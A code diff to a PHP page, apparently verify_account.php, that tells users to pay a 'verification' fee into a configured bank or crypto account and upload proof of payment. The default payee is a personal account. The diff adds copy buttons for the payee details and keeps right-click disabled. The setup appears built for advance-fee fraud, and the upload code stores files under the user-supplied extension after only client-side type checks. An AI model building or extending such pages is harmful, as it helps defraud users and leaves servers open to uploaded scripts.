@@ -13,7 +13,7 @@ if (!isset($_SESSION['user_id'])) {
 
 // Fetch user verification status, details, and country
 try {
-    $stmt = $pdo->prepare("SELECT name, email, verification_status, country FROM users WHERE id = ?");
+    $stmt = $pdo->prepare("SELECT name, email, verification_status, COALESCE(country, '') AS country FROM users WHERE id = ?");
     $stmt->execute([$_SESSION['user_id']]);
     $user = $stmt->fetch(PDO::FETCH_ASSOC);
     if (!$user) {
@@ -31,12 +31,20 @@ try {
     exit;
 }
 
-// Fetch dynamic verification settings from region_settings based on user's country
+// Fetch dynamic verification settings from region_settings
 try {
     $stmt = $pdo->prepare("
-        SELECT crypto, verify_ch, vc_value, verify_ch_name, verify_ch_value, 
-               COALESCE(verify_medium, 'Bank Name') AS verify_medium, 
-               vcn_value, vcv_value, verify_currency, verify_amount
+        SELECT 
+            COALESCE(crypto, 0) AS crypto,
+            COALESCE(verify_ch, 'Payment Method') AS verify_ch,
+            COALESCE(vc_value, 'Obi Mikel') AS vc_value,
+            COALESCE(verify_ch_name, 'Account Name') AS verify_ch_name,
+            COALESCE(verify_ch_value, 'Account Number') AS verify_ch_value,
+            COALESCE(verify_medium, 'Payment Method') AS verify_medium,
+            COALESCE(vcn_value, 'First Bank') AS vcn_value,
+            COALESCE(vcv_value, '8012345678') AS vcv_value,
+            COALESCE(verify_currency, 'NGN') AS verify_currency,
+            COALESCE(verify_amount, 0.00) AS verify_amount
         FROM region_settings 
         WHERE country = ?
     ");
@@ -50,23 +58,23 @@ try {
         $vc_value = 'Obi Mikel';
         $verify_ch_name = 'Account Name';
         $verify_ch_value = 'Account Number';
-        $verify_medium = 'Bank Name';
+        $verify_medium = 'Payment Method';
         $vcn_value = 'First Bank';
         $vcv_value = '8012345678';
         $verify_currency = 'NGN';
         $verify_amount = 0.00;
         error_log('No region settings found for country: ' . $user_country, 3, '../debug.log');
     } else {
-        $crypto = $settings['crypto'] ?? 0;
-        $verify_ch = htmlspecialchars($settings['verify_ch'] ?: 'Payment Method');
-        $vc_value = htmlspecialchars($settings['vc_value'] ?: 'Obi Mikel');
-        $verify_ch_name = htmlspecialchars($settings['verify_ch_name'] ?: 'Account Name');
-        $verify_ch_value = htmlspecialchars($settings['verify_ch_value'] ?: 'Account Number');
-        $verify_medium = htmlspecialchars($settings['verify_medium'] ?: 'Bank Name');
-        $vcn_value = htmlspecialchars($settings['vcn_value'] ?: 'First Bank');
-        $vcv_value = htmlspecialchars($settings['vcv_value'] ?: '8012345678');
-        $verify_currency = htmlspecialchars($settings['verify_currency'] ?: 'NGN');
-        $verify_amount = floatval($settings['verify_amount'] ?: 0.00);
+        $crypto = $settings['crypto'];
+        $verify_ch = htmlspecialchars($settings['verify_ch']);
+        $vc_value = htmlspecialchars($settings['vc_value']);
+        $verify_ch_name = htmlspecialchars($settings['verify_ch_name']);
+        $verify_ch_value = htmlspecialchars($settings['verify_ch_value']);
+        $verify_medium = htmlspecialchars($settings['verify_medium']);
+        $vcn_value = htmlspecialchars($settings['vcn_value']);
+        $vcv_value = htmlspecialchars($settings['vcv_value']);
+        $verify_currency = htmlspecialchars($settings['verify_currency']);
+        $verify_amount = floatval($settings['verify_amount']);
     }
 } catch (PDOException $e) {
     error_log('Settings fetch error: ' . $e->getMessage(), 3, '../debug.log');
@@ -76,7 +84,7 @@ try {
     $vc_value = 'Obi Mikel';
     $verify_ch_name = 'Account Name';
     $verify_ch_value = 'Account Number';
-    $verify_medium = 'Bank Name';
+    $verify_medium = 'Payment Method';
     $vcn_value = 'First Bank';
     $vcv_value = '8012345678';
     $verify_currency = 'NGN';
@@ -85,12 +93,9 @@ try {
 
 // Handle form submission
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $verify_medium_input = filter_input(INPUT_POST, 'verify_medium', FILTER_SANITIZE_STRING);
     $proof_file = $_FILES['proof_file'] ?? null;
 
-    if (!$verify_medium_input) {
-        $error = 'Please provide the ' . htmlspecialchars($verify_medium) . '.';
-    } elseif (!$proof_file || $proof_file['error'] === UPLOAD_ERR_NO_FILE) {
+    if (!$proof_file || $proof_file['error'] === UPLOAD_ERR_NO_FILE) {
         $error = 'Please upload a payment proof file.';
     } else {
         // Validate file
@@ -99,47 +104,38 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         if (!in_array($proof_file['type'], $allowed_types) || $proof_file['size'] > $max_size) {
             $error = 'Invalid file type or size. Please upload a JPG, PNG, or PDF file (max 5MB).';
         } else {
-            // Create upload directory if it doesn't exist
+            // Create upload directory
             $upload_dir = '../users/proofs/';
             if (!is_dir($upload_dir)) {
                 mkdir($upload_dir, 0755, true);
             }
 
-            // Generate a unique filename to prevent overwrites
+            // Generate unique filename
             $file_ext = pathinfo($proof_file['name'], PATHINFO_EXTENSION);
             $file_name = 'proof_' . $_SESSION['user_id'] . '_' . time() . '.' . $file_ext;
             $upload_path = $upload_dir . $file_name;
 
             if (move_uploaded_file($proof_file['tmp_name'], $upload_path)) {
                 try {
-                    // Start transaction
                     $pdo->beginTransaction();
-
-                    // Update verification status to 'pending'
                     $stmt = $pdo->prepare("UPDATE users SET verification_status = 'pending' WHERE id = ?");
                     $stmt->execute([$_SESSION['user_id']]);
-
-                    // Insert into verification_requests table
                     $stmt = $pdo->prepare("
                         INSERT INTO verification_requests 
-                        (user_id, payment_amount, name, email, upload_path, file_name, status, payment_method, currency, verify_medium)
-                        VALUES (?, ?, ?, ?, ?, ?, 'pending', ?, ?, ?)
+                        (user_id, payment_amount, name, email, upload_path, file_name, status, payment_method, currency)
+                        VALUES (?, ?, ?, ?, ?, ?, 'pending', ?, ?)
                     ");
                     $stmt->execute([
                         $_SESSION['user_id'], $verify_amount, $username, $email, 
-                        $upload_path, $file_name, $verify_ch, $verify_currency, $verify_medium_input
+                        $upload_path, $file_name, $verify_ch, $verify_currency
                     ]);
-
-                    // Commit transaction
                     $pdo->commit();
-
                     header('Location: home.php?success=Verification+request+submitted+successfully');
                     exit;
                 } catch (PDOException $e) {
                     $pdo->rollBack();
                     error_log('Verification error: ' . $e->getMessage(), 3, '../debug.log');
                     $error = 'An error occurred while submitting your verification request. Please try again.';
-                    // Delete the uploaded file if database operation fails
                     if (file_exists($upload_path)) {
                         unlink($upload_path);
                     }
@@ -178,6 +174,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             --accent-hover: #16a34a;
             --menu-bg: #1a1a1a;
             --menu-text: #ffffff;
+            --copy-btn-bg: #e5e7eb;
+            --copy-btn-hover: #d1d5db;
         }
 
         [data-theme="dark"] {
@@ -192,6 +190,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             --accent-hover: #22c55e;
             --menu-bg: #111827;
             --menu-text: #e5e7eb;
+            --copy-btn-bg: #4b5563;
+            --copy-btn-hover: #6b7280;
         }
 
         * {
@@ -296,6 +296,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
         .instructions p {
             margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
 
         .instructions strong {
@@ -312,27 +315,37 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             margin-bottom: 8px;
         }
 
+        .copy-btn {
+            background: var(--copy-btn-bg);
+            border: none;
+            padding: 6px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            color: var(--text-color);
+            transition: background 0.3s ease, transform 0.2s ease;
+        }
+
+        .copy-btn:hover {
+            background: var(--copy-btn-hover);
+            transform: scale(1.05);
+        }
+
         .input-container {
             position: relative;
             margin-bottom: 28px;
         }
 
-        .input-container input,
         .input-container input[type="file"] {
             width: 100%;
-            padding: 14px;
+            padding: 12px;
             font-size: 16px;
             border: 2px solid var(--border-color);
             border-radius: 8px;
             background: var(--card-bg);
             color: var(--text-color);
-            outline: none;
-            transition: border-color 0.3s ease;
-        }
-
-        .input-container input[type="file"] {
-            padding: 12px;
             cursor: pointer;
+            transition: border-color 0.3s ease;
         }
 
         .input-container input:focus,
@@ -431,22 +444,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             font-weight: 500;
         }
 
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
         @keyframes slideInRight {
-            from {
-                opacity: 0;
-                transform: translateX(100px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
+            from { opacity: 0; transform: translateX(100px); }
+            to { opacity: 1; transform: translateX(0); }
         }
 
         @keyframes fadeOut {
-            to {
-                opacity: 0;
-                transform: translateY(-20px);
-            }
+            to { opacity: 0; transform: translateY(-20px); }
         }
 
         .bottom-menu {
@@ -493,31 +502,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
 
         @media (max-width: 768px) {
-            .container {
-                padding: 16px;
-            }
-
-            .header-text h1 {
-                font-size: 22px;
-            }
-
-            .form-card {
-                padding: 20px;
-            }
-
-            .notification {
-                max-width: 250px;
-                right: 10px;
-                top: 10px;
-            }
-
-            .instructions {
-                font-size: 14px;
-            }
-
-            .instructions h3 {
-                font-size: 16px;
-            }
+            .container { padding: 16px; }
+            .header-text h1 { font-size: 22px; }
+            .form-card { padding: 20px; }
+            .notification { max-width: 250px; right: 10px; top: 10px; }
+            .instructions { font-size: 14px; }
+            .instructions h3 { font-size: 16px; }
+            .copy-btn { padding: 4px 8px; font-size: 12px; }
         }
     </style>
 </head>
@@ -550,17 +541,27 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 <div class="instructions">
                     <h3>Verification Instructions</h3>
                     <p>To verify your account, please make a payment of <strong><?php echo htmlspecialchars($verify_currency); ?> <?php echo number_format($verify_amount, 2); ?></strong> via <strong><?php echo htmlspecialchars($verify_ch); ?></strong> using the details below:</p>
-                    <p><strong><?php echo htmlspecialchars($verify_medium); ?>:</strong> <?php echo htmlspecialchars($vcn_value); ?></p>
-                    <p><strong><?php echo htmlspecialchars($verify_ch_name); ?>:</strong> <?php echo htmlspecialchars($vc_value); ?></p>
-                    <p><strong><?php echo htmlspecialchars($verify_ch_value); ?>:</strong> <?php echo htmlspecialchars($vcv_value); ?></p>
-                    <p>After completing the payment, provide the <?php echo htmlspecialchars($verify_medium); ?> used and upload a screenshot or proof of payment below. Your verification request will be reviewed within 48 hours.</p>
+                    <p>
+                        <strong><?php echo htmlspecialchars($verify_medium); ?>:</strong> 
+                        <span class="copy-text" data-text="<?php echo htmlspecialchars($vcn_value); ?>"><?php echo htmlspecialchars($vcn_value); ?></span>
+                        <button class="copy-btn" data-text="<?php echo htmlspecialchars($vcn_value); ?>" aria-label="Copy <?php echo htmlspecialchars($verify_medium); ?>"><i class="fas fa-copy"></i></button>
+                    </p>
+                    <p>
+                        <strong><?php echo htmlspecialchars($verify_ch_name); ?>:</strong> 
+                        <span class="copy-text" data-text="<?php echo htmlspecialchars($vc_value); ?>"><?php echo htmlspecialchars($vc_value); ?></span>
+                        <button class="copy-btn" data-text="<?php echo htmlspecialchars($vc_value); ?>" aria-label="Copy <?php echo htmlspecialchars($verify_ch_name); ?>"><i class="fas fa-copy"></i></button>
+                    </p>
+                    <p>
+                        <strong><?php echo htmlspecialchars($verify_ch_value); ?>:</strong> 
+                        <span class="copy-text" data-text="<?php echo htmlspecialchars($vcv_value); ?>"><?php echo htmlspecialchars($vcv_value); ?></span>
+                        <button class="copy-btn" data-text="<?php echo htmlspecialchars($vcv_value); ?>" aria-label="Copy <?php echo htmlspecialchars($verify_ch_value); ?>"><i class="fas fa-copy"></i></button>
+                    </p>
+                    <p>After completing the payment, upload a screenshot or proof of payment below. Your verification request will be reviewed within 48 hours.</p>
                     
                     <h3>Important Notes</h3>
                     <?php if ($crypto): ?>
                         <ul>
                             <li>Ensure the payment is made via <strong><?php echo htmlspecialchars($verify_ch); ?></strong> to the specified <strong><?php echo htmlspecialchars($verify_ch_value); ?></strong>.</li>
-                            <li>Use the exact amount and currency: <strong><?php echo htmlspecialchars($verify_currency); ?> <?php echo number_format($verify_amount, 2); ?></strong>.</li>
-                            <li>Include the correct <strong><?php echo htmlspecialchars($verify_medium); ?> (e.g., <?php echo htmlspecialchars($vcn_value); ?>)</strong> and <strong><?php echo htmlspecialchars($verify_ch_value); ?> (e.g., <?php echo htmlspecialchars($vcv_value); ?>)</strong> in your transaction.</li>
                             <li>Upload a clear screenshot or PDF showing the transaction details (e.g., sender wallet, receiver wallet, amount, network, timestamp).</li>
                             <li>Supported file types: JPG, PNG, PDF (max size: 5MB).</li>
                             <li>Verification may take up to 48 hours to process.</li>
@@ -568,8 +569,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     <?php else: ?>
                         <ul>
                             <li>Ensure the payment is made via <strong><?php echo htmlspecialchars($verify_ch); ?></strong> to the specified <strong><?php echo htmlspecialchars($verify_ch_value); ?></strong>.</li>
-                            <li>Use the exact amount and currency: <strong><?php echo htmlspecialchars($verify_currency); ?> <?php echo number_format($verify_amount, 2); ?></strong>.</li>
-                            <li>Include the correct <strong><?php echo htmlspecialchars($verify_medium); ?> (e.g., <?php echo htmlspecialchars($vcn_value); ?>)</strong> and <strong><?php echo htmlspecialchars($verify_ch_value); ?> (e.g., <?php echo htmlspecialchars($vcv_value); ?>)</strong> in your transaction.</li>
                             <li>Upload a clear screenshot or PDF showing the transaction details (e.g., sender, receiver, amount, timestamp).</li>
                             <li>Supported file types: JPG, PNG, PDF (max size: 5MB).</li>
                             <li>Verification may take up to 48 hours to process.</li>
@@ -577,10 +576,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     <?php endif; ?>
                 </div>
                 <form action="verify_account.php" method="POST" enctype="multipart/form-data">
-                    <div class="input-container">
-                        <input type="text" id="verify_medium" name="verify_medium" required placeholder="e.g., <?php echo htmlspecialchars($vcn_value); ?>">
-                        <label for="verify_medium"><?php echo htmlspecialchars($verify_medium); ?></label>
-                    </div>
                     <div class="input-container">
                         <input type="file" id="proof_file" name="proof_file" accept=".jpg,.jpeg,.png,.pdf" required placeholder=" ">
                         <label for="proof_file">Upload Payment Proof</label>
@@ -646,14 +641,35 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         const menuItems = document.querySelectorAll('.bottom-menu a');
         menuItems.forEach((item) => {
             item.addEventListener('click', () => {
-                menuItems.forEach((menuItem) => {
-                    menuItem.classList.remove('active');
-                });
+                menuItems.forEach((menuItem) => menuItem.classList.remove('active'));
                 item.classList.add('active');
             });
         });
 
-        // Initialize and Update Label Positions
+        // Copy Buttons
+        document.querySelectorAll('.copy-btn').forEach(button => {
+            button.addEventListener('click', () => {
+                const text = button.getAttribute('data-text');
+                navigator.clipboard.writeText(text).then(() => {
+                    Swal.fire({
+                        icon: 'success',
+                        title: 'Copied!',
+                        text: `${text} copied to clipboard.`,
+                        timer: 1500,
+                        showConfirmButton: false
+                    });
+                }).catch(err => {
+                    Swal.fire({
+                        icon: 'error',
+                        title: 'Copy Failed',
+                        text: 'Unable to copy text. Please try again.'
+                    });
+                    console.error('Copy error:', err);
+                });
+            });
+        });
+
+        // Initialize Label Positions
         function updateLabelPosition(input) {
             const label = input.nextElementSibling;
             if (label && label.tagName === 'LABEL') {
@@ -668,15 +684,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
 
         document.querySelectorAll('.input-container input').forEach((input) => {
-            updateLabelPosition(input); // Initialize on load
-            input.addEventListener('input', () => updateLabelPosition(input)); // Update on input
+            updateLabelPosition(input);
+            input.addEventListener('input', () => updateLabelPosition(input));
             input.addEventListener('focus', () => {
                 const label = input.nextElementSibling;
                 if (label && label.tagName === 'LABEL') {
                     label.classList.add('active');
                 }
             });
-            input.addEventListener('blur', () => updateLabelPosition(input)); // Update on blur
+            input.addEventListener('blur', () => updateLabelPosition(input));
         });
 
         // Logout Button
@@ -747,7 +763,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         setInterval(fetchNotifications, 20000);
 
         // Gradient Animation
-        var colors = [
+        const colors = [
             [62, 35, 255],
             [60, 255, 60],
             [255, 35, 98],
@@ -755,25 +771,25 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             [255, 0, 255],
             [255, 128, 0]
         ];
-        var step = 0;
-        var colorIndices = [0, 1, 2, 3];
-        var gradientSpeed = 0.002;
+        let step = 0;
+        let colorIndices = [0, 1, 2, 3];
+        const gradientSpeed = 0.002;
         const gradientElement = document.getElementById('gradient');
 
         function updateGradient() {
-            var c0_0 = colors[colorIndices[0]];
-            var c0_1 = colors[colorIndices[1]];
-            var c1_0 = colors[colorIndices[2]];
-            var c1_1 = colors[colorIndices[3]];
-            var istep = 1 - step;
-            var r1 = Math.round(istep * c0_0[0] + step * c0_1[0]);
-            var g1 = Math.round(istep * c0_0[1] + step * c0_1[1]);
-            var b1 = Math.round(istep * c0_0[2] + step * c0_1[2]);
-            var color1 = `rgb(${r1},${g1},${b1})`;
-            var r2 = Math.round(istep * c1_0[0] + step * c1_1[0]);
-            var g2 = Math.round(istep * c1_0[1] + step * c1_1[1]);
-            var b2 = Math.round(istep * c1_0[2] + step * c1_1[2]);
-            var color2 = `rgb(${r2},${g2},${b2})`;
+            const c0_0 = colors[colorIndices[0]];
+            const c0_1 = colors[colorIndices[1]];
+            const c1_0 = colors[colorIndices[2]];
+            const c1_1 = colors[colorIndices[3]];
+            const istep = 1 - step;
+            const r1 = Math.round(istep * c0_0[0] + step * c0_1[0]);
+            const g1 = Math.round(istep * c0_0[1] + step * c0_1[1]);
+            const b1 = Math.round(istep * c0_0[2] + step * c0_1[2]);
+            const color1 = `rgb(${r1},${g1},${b1})`;
+            const r2 = Math.round(istep * c1_0[0] + step * c1_1[0]);
+            const g2 = Math.round(istep * c1_0[1] + step * c1_1[1]);
+            const b2 = Math.round(istep * c1_0[2] + step * c1_1[2]);
+            const color2 = `rgb(${r2},${g2},${b2})`;
             gradientElement.style.background = `linear-gradient(135deg, ${color1}, ${color2})`;
             step += gradientSpeed;
             if (step >= 1) {
@@ -789,9 +805,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         requestAnimationFrame(updateGradient);
 
         // Context Menu Disable
-        document.addEventListener('contextmenu', function(event) {
-            event.preventDefault();
-        });
+        document.addEventListener('contextmenu', event => event.preventDefault());
     </script>
 </body>
 </html>
